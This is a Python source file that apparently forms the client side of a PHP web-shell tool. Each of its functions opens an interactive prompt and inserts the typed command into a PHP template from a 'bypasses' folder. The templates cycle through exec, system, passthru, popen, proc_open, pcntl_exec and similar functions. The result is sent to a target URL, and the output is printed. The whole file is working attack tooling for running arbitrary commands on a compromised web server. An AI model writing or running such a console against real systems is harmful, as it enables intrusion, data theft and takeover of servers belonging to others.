import modules.send as send

def exec(url,uagent):
    while True:
        cmd = input("@exec~: ")
        if cmd == "exit":
            break
        with open('bypasses\\exec\\exec.php') as f:data = f.read()
        data = data.replace("$exec = $_LOCAL;", f"$exec = \'{cmd}\';")
        print(send.send(url,data,uagent))

def shell_exec(url,uagent):
    while True:
        cmd = input("@shell_exec~: ")
        if cmd == "exit":
            break
        with open('bypasses\\exec\\shell_exec.php') as f:data = f.read()
        data = data.replace("$exec = $_LOCAL;", f"$exec = \'{cmd}\';")
        print(send.send(url,data,uagent))

def system(url,uagent):
    while True:
        cmd = input("@system~: ")
        if cmd == "exit":
            break
        with open('bypasses\\exec\\system.php') as f:data = f.read()
        data = data.replace("$exec = $_LOCAL;", f"$exec = \'{cmd}\';")
        print(send.send(url,data,uagent))

def passthru(url,uagent):
    while True:
        cmd = input("@passthru~: ")
        if cmd == "exit":
            break
        with open('bypasses\\exec\\passthru.php') as f:data = f.read()
        data = data.replace("$exec = $_LOCAL;", f"$exec = \'{cmd}\';")
        print(send.send(url,data,uagent))

def popen(url,uagent):
    while True:
        cmd = input("@popen~: ")
        if cmd == "exit":
            break
        with open('bypasses\\exec\\popen.php') as f:data = f.read()
        data = data.replace("$exec = $_LOCAL;", f"$exec = \'{cmd}\';")
        print(send.send(url,data,uagent))

def proc_open(url,uagent):
    while True:
        cmd = input("@proc_open~: ")
        if cmd == "exit":
            break
        with open('bypasses\\exec\\proc_open.php') as f:data = f.read()
        data = data.replace("$exec = $_LOCAL;", f"$exec = \'{cmd}\';")
        print(send.send(url,data,uagent))

def expect_popen(url,uagent):
    while True:
        cmd = input("@expect_popen~: ")
        if cmd == "exit":
            break
        with open('bypasses\\exec\\expect_popen.php') as f:data = f.read()
        data = data.replace("$exec = $_LOCAL;", f"$exec = \'{cmd}\';")
        print(send.send(url,data,uagent))

def pcntl_exec(url,uagent):
    while True:
        cmd = input("@pcntl_exec~: ")
        if cmd == "exit":
            break
        with open('bypasses\\exec\\pcntl_exec.php') as f:data = f.read()
        data = data.replace("$exec = $_LOCAL;", f"$exec = \'{cmd}\';")
        print(send.send(url,data,uagent))

def do(url,uagent):
    while True:
        cmd = input("@~: ")
        if cmd == "exit":
            break
        with open('bypasses\\exec\\do.php') as f:data = f.read()
        data = data.replace("$exec = $_LOCAL;", f"$exec = \'{cmd}\';")
        print(send.send(url,data,uagent))